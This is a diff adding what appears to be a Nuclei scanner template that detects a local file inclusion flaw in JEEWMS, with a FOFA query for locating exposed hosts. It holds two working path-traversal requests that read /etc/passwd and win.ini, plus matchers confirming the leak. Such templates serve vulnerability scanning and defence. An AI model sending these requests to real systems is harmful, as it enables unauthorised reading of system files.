@@ -1,0 +1,37 @@
+id: jeewms-lfi
+
+info:
+  name: JEEWMS - Local File Inclusion
+  author: Co5mos
+  severity: high
+  description: JEEWMS is vulnerable to local file inclusion.
+  reference:
+    - http://wiki.fofamini.com/%E6%BC%8F%E6%B4%9E%E5%BA%93/Web%E5%AE%89%E5%85%A8/JEEWMS/JEEWMS%E5%AD%98%E5%9C%A8%E6%9C%AA%E6%8E%88%E6%9D%83%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E.md
+  metadata:
+    fofa-query: body="plug-in/lhgDialog/lhgdialog.min.js?skin=metro"
+  tags: jeewms,lfi
+
+http:
+  - raw:
+      - | #linux
+        GET /systemController/showOrDownByurl.do?down=&dbPath=../../../../../../etc/passwd HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+
+      - | #windows
+        GET /systemController/showOrDownByurl.do?down=&dbPath=../Windows/win.ini HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+
+    matchers-condition: and
+    matchers:
+      - type: regex
+        regex:
+          - "root:.*:0:0:"
+          - "\\[(font|extension|file)s\\]"
+        condition: or
+        part: body
+
+      - type: status
+        status:
+          - 200
